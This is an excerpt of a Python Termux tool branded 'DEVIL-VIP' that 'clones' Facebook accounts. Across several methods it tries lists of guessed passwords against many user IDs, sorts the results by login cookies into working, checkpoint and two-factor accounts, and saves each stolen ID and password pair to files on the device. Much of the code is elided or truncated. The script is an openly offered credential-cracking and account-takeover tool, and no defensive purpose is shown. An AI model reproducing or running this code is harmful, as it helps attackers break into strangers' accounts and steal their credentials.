...
try:
	...
	os.system('xdg-open https://www.facebook.com/profile.php?id=100076507500762/?ref=share')
try:
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; devil \x07')
...
ha = current.day
today = date.today()
devil2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
import random
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Github                  • \33[1;38mhttps://github.com/DEVILVIP1/DEVIL-VIP ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • DEVIL.LY       ║  \033[1;97m  
╠══[Whatsapp                 • +218*******  ║\33[1;35m 
╠══[TOOLS                    • File & Random ]         ║ \33[1;32m   
╠══[VERSION                  • V 1.0 DEVIL.VIP ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m DEVIL \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                  \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m DEVIL🏴‍☠️ TERMUX ZONE 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●             \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱"""
...
def saprate():
    ...
    print('\033[1;32m Example /sDEVIL-VIPVIL-VIP 𖣱-81.txt')
...
def main():
    ...
    print(logo)
    print('           \x1b[97m[\033[37;41m  DEVIL-VIP 🔥𖣱  \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO DEVIL 𖣱 TOOL \033[0;m] ")
    print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
    print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
    print(f"{BLUE}══════════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}RANDOM CLONE {RED}[NO UPDATE]")
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {devil2} : ')
    os.system('clear')
    print(logo)
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/​DEVIL-VIP 𖣱_OK.txt\n[•] CP IDS SAVE : /sdcard/​DEVIL-VIP 𖣱_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[​DEVIL-VIP 𖣱🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                print('\r\033[1;32m[​DEVIL-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/​DEVIL-VIP 𖣱_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    os.system("play-audio ​DEVIL_2F.mp3")
                    print('\r\033[1;35m[​DEVIL-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/​DEVIL-VIP 𖣱_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio ​DEVIL_CP.mp3")
                    print('\r\033[1;31m[​DEVIL-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/​DEVIL_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio ​DEVIL_OK.mp3")
                print('\r\033[1;32m[​DEVIL-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/​DEVIL_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio ​DEVIL_2F.mp3")
                    print('\r\033[1;35m[​DEVIL-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/​DEVIL2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio ​DEVIL _CP.mp3")
                    print('\r\033[1;31m[​DEVIL-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/​DEVIL-VIP 𖣱_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[​DEVIL-VIP 𖣱 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    print('\r\033[1;92m[​DEVIL-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/​DEVIL_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[24:39]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio ​DEVIL_2F.mp3")
                        print('\r\033[1;95m[​DEVIL-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/​DEVIL 𖣱_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                            ...
                            os.system("play-audio ​DEVIL_CP.mp3")
                            print('\r\033[1;94m[​DEVIL-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/​DEVIL-VIP 𖣱_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) devil
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/​DEVIL-VIP 𖣱-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/​DEVIL-VIP 𖣱-CP.txt')
...
def pass4():
    ...
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/​DEVIL-VIP ??-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/​DEVIL-VIP 𖣱-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/​DEVIL-VIP 𖣱-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/​DEVIL-VIP 𖣱-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[​DEVIL-VIP 𖣱 🔥] [%s] \33[1;97m[OK:%s{devil2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
